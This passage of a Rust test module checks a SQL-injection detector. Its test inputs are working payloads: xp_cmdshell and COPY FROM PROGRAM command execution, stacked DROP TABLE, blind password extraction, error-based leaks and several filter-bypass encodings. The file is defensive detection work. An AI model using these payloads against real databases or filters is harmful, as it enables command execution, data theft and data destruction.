            dets.iter()
                .any(|d| d.detection_type == "db_specific_primitive")
        );
    }

    #[test]
    fn detect_mssql_xp_cmdshell() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("EXEC xp_cmdshell 'whoami'--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "db_specific_primitive")
        );
    }

    #[test]
    fn detect_sqlite_attach_database() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ATTACH DATABASE '/tmp/evil.db' AS evil--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "db_specific_primitive")
        );
    }

    #[test]
    fn detect_alternative_whitespace_waf_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("UNION\x0BSELECT\x0C1--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "alt_whitespace_bypass")
        );
    }

    #[test]
    fn detect_unicode_smuggling_waf_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ＳＥＬＥＣＴ 1--");
        assert!(dets.iter().any(|d| d.detection_type == "unicode_smuggling"));
    }

    #[test]
    fn detect_scientific_notation_tautology() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1e0=1e0--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "scientific_tautology")
        );
    }

    #[test]
    fn detect_backtick_keyword_union_select_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("`union` `select` username,password from users");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "backtick_keyword_bypass")
        );
    }

    #[test]
    fn detect_backtick_keyword_union_all_select_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("`union` `all` `select` 1,2");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "backtick_keyword_bypass")
        );
    }

    #[test]
    fn detect_comment_split_union_multiline() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("u/**/n/**/i/**/o/**/n select 1");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "comment_keyword_split")
        );
    }

    #[test]
    fn detect_comment_split_select_with_hash_newline() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("s#x\ne#y\nl#z\ne#k\nc#q\nt 1 from dual");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "comment_keyword_split")
        );
    }

    #[test]
    fn detect_unhex_function_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT UNHEX('756e696f6e2073656c656374')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "hex_unicode_function")
        );
    }

    #[test]
    fn detect_char_function_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT CHAR(85,78,73,79,78,32,83,69,76,69,67,84)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "hex_unicode_function")
        );
    }

    #[test]
    fn detect_unicode_escape_chain_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect(
            "\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054",
        );
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "hex_unicode_function")
        );
    }

    #[test]
    fn detect_numeric_dollar_quoted_stacked_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("$1459173$; DROP TABLE users;$1459173$");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "numeric_dollar_quote")
        );
    }

    #[test]
    fn detect_numeric_dollar_quoted_union_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("$20242026$UNION SELECT user,pass FROM users$20242026$");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "numeric_dollar_quote")
        );
    }

    #[test]
    fn detect_group_by_subquery_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("GROUP BY (SELECT COUNT(*) FROM users WHERE role='admin')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "subquery_injection")
        );
    }

    #[test]
    fn detect_like_wildcard_boolean_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' OR username LIKE '%admin%' --");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "like_wildcard_injection")
        );
    }

    #[test]
    fn detect_like_wildcard_where_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("WHERE email LIKE '%@corp.com' AND 1=1");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "like_wildcard_injection")
        );
    }

    #[test]
    fn detect_mssql_stacked_variant_declare() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1; DECLARE @x INT; SELECT @x");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dbms_stacked_variant")
        );
    }

    #[test]
    fn detect_oracle_plsql_stacked_variant() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dbms_stacked_variant")
        );
    }

    #[test]
    fn detect_mysql_stacked_set_session_variant() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1; SET @x = (SELECT user())");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dbms_stacked_variant")
        );
    }

    #[test]
    fn detect_sql_boolean_blind_extraction_pattern() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("AND MID((SELECT password FROM users),1,1)<'a'");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "sql_boolean_blind_extraction")
        );
    }

    #[test]
    fn detect_boolean_blind_count_subquery() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("AND 1=(SELECT COUNT(*) FROM users WHERE role='admin')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "boolean_blind_subquery")
        );
    }

    #[test]
    fn detect_boolean_blind_exists_subquery() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("OR EXISTS(SELECT 1 FROM users WHERE id=1)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "boolean_blind_subquery")
        );
    }

    #[test]
    fn detect_advanced_error_polygon_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("AND polygon((SELECT CONCAT(0x7e,version(),0x7e)))");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "advanced_error_oracle")
        );
    }

    #[test]
    fn detect_advanced_error_updatexml_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "advanced_error_oracle")
        );
    }

    #[test]
    fn detect_json_where_operator_arrow_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT * FROM users WHERE profile->>'$.role' = 'admin'");
        assert!(dets.iter().any(|d| d.detection_type == "json_where_abuse"));
    }

    #[test]
    fn detect_json_where_extract_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT * FROM users WHERE JSON_EXTRACT(data, '$.role') = 'admin'");
        assert!(dets.iter().any(|d| d.detection_type == "json_where_abuse"));
    }

    #[test]
    fn detect_insert_on_duplicate_key_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect(
            "INSERT INTO users(id,name) VALUES(1,'a') ON DUPLICATE KEY UPDATE role='admin'",
        );
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "insert_update_injection")
        );
    }

    #[test]
    fn detect_update_set_subquery_injection() {
        let eval = SqlStructuralEvaluator;
        let dets =
            eval.detect("UPDATE users SET role=(SELECT password FROM users LIMIT 1) WHERE id=1");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "insert_update_injection")
        );
    }

    #[test]
    fn detect_insert_select_injection_pattern() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("INSERT INTO archive SELECT username,password FROM users");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "insert_update_injection")
        );
    }

    #[test]
    fn detect_error_based_sqli_positive() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("extractvalue(1, concat(0x7e, (SELECT version())))");
        assert!(dets.iter().any(|d| d.detection_type == "error_based_sqli"));
    }

    #[test]
    fn detect_error_based_sqli_negative() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT * FROM users WHERE id = 1");
        assert!(!dets.iter().any(|d| d.detection_type == "error_based_sqli"));
    }

    #[test]
    fn detect_second_order_sqli_positive() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("username=' UNION SELECT 1,2,3--@");
        assert!(dets.iter().any(|d| d.detection_type == "second_order_sqli"));
    }

    #[test]
    fn detect_second_order_sqli_negative() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("username='john.doe'");
        assert!(!dets.iter().any(|d| d.detection_type == "second_order_sqli"));
    }

    #[test]
    fn detect_mysql_versioned_wildcard_positive() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("/*!12345SELECT * FROM users*/");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "mysql_versioned_comment")
        );
    }

    #[test]
    fn detect_mysql_versioned_wildcard_negative() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("/*!123456789*/");
        assert!(
            !dets
                .iter()
                .any(|d| d.detection_type == "mysql_versioned_comment")
        );
    }

    #[test]
    fn detect_postgres_e_escape_keyword_sequence() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect(r#"E'\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54'"#);
        assert!(dets.iter().any(|d| {
            d.detection_type == "postgres_escape_keyword" && d.confidence > 0.7
        }));
    }

    #[test]
    fn detect_mysql_binary_literal_keyword_construction() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("0b0101010101001110010010010100111101001110");
        assert!(dets.iter().any(|d| {
            d.detection_type == "mysql_binary_literal" && d.confidence > 0.7
        }));
    }

    #[test]
    fn detect_oracle_q_quote_keyword_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("q'[UNION SELECT username FROM users]'");
        assert!(dets.iter().any(|d| {
            d.detection_type == "oracle_q_quote_keyword" && d.confidence > 0.7
        }));
    }

    #[test]
    fn detect_mssql_bracketed_identifier_keyword_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("[xp_cmdshell]");
        assert!(dets.iter().any(|d| {
            d.detection_type == "mssql_bracket_identifier_abuse" && d.confidence > 0.7
        }));
    }

    #[test]
    fn detect_mysql_pipe_concat_keyword_builder() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("'u'||'n'||'i'||'o'||'n'");
        assert!(dets.iter().any(|d| {
            d.detection_type == "mysql_pipe_concat_bypass" && d.confidence > 0.7
        }));
    }

    #[test]
    fn detect_unicode_normalization_keyword_smuggling() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ＵＮＩＯＮ ＳＥＬＥＣＴ");
        assert!(dets.iter().any(|d| {
            d.detection_type == "unicode_normalization_sqli" && d.confidence > 0.7
        }));
    }

    #[test]
    fn test_copy_from_program() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("COPY results FROM PROGRAM 'id'");
        assert!(dets.iter().any(|d| d.detection_type == "sql_pg_copy_from_program"));
    }

    #[test]
    fn test_zero_width_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("UNION\u{200B}SELECT");
        assert!(dets.iter().any(|d| d.detection_type == "sql_zero_width_bypass"));
    }

    #[test]
    fn test_pg_unicode_escape() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("U&'\\0073\\0065\\006c\\0065\\0063\\0074'");
        assert!(dets.iter().any(|d| d.detection_type == "sql_pg_unicode_escape"));
    }

    #[test]
    fn test_bitwise_tautology() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1 OR 1|1=1");
        assert!(dets.iter().any(|d| d.detection_type == "sql_bitwise_tautology"));
    }

    #[test]
    fn test_hex_x_literal() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("X'53454c454354'");
        assert!(dets.iter().any(|d| d.detection_type == "sql_hex_x_literal"));
    }

    #[test]
    fn test_sqlite_pragma() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("PRAGMA table_info(users)");
        assert!(dets.iter().any(|d| d.detection_type == "sql_sqlite_pragma"));
    }
}
